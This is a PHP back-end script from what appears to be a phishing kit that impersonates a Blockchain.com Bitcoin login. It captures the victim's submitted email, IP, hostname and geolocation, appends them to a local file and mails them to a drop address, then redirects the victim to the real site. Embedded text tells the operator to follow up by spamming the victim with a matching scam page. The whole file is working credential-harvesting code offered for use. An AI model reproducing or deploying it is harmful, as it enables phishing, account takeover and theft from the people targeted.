<?php
 $time = date('l jS \of F Y h:i:s A');
 $ip = getenv("REMOTE_ADDR");
 $J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
 $CNCD = $J7->geoplugin_countryCode ;
 $STCD = $J7->geoplugin_regionCode ;
 $hostname = gethostbyaddr($ip);
 $rnessage.= "-------------------+ [ BTC LogIn :) ] +--------------------\n";
 $message .= "[+] Email                     ===> ".$_POST['UID_input']."\n";
 $message .= "Now Send Spam To This Email With Scam Page Email Site , So If Email Address Gmail , Download Scam Gmail And Fuck That Email \n"; 
 $message .= "[+] Time                      ===> ".$time."\n";
 $rnessage.= "-------------------+ [ $ip ] +-----------------------------\n";
 $message .= "IP Address : ".$ip."\n";
 $message .= "HostName : ".$hostname."\n";
 $timedate = $_POST['historys'];
 $rnessage = "$message\n";
 $rnessage.= "-------------------+ [ Libyan_shell ] +--------------------\n";
 $subject = "New LogIn ReZulT  ~>| $CNCD | $STCD | Fr0m $ip";
 $headers = "From:LibyanShell~<result@spam.com>";
 $send    = "email@mail.com";
 $headers .= $_POST['eMailAdd']."\n";
 $headers .= "MIME-Version: 1.0\n";
 $file = fopen("email.txt", 'a');
 fwrite($file, $message);
 mail($send,$subject,$rnessage,$headers);
 mail($subject,$rnessage,$headers);
 header("Location: https://www.blockchain.com/about/index.html");
 ?>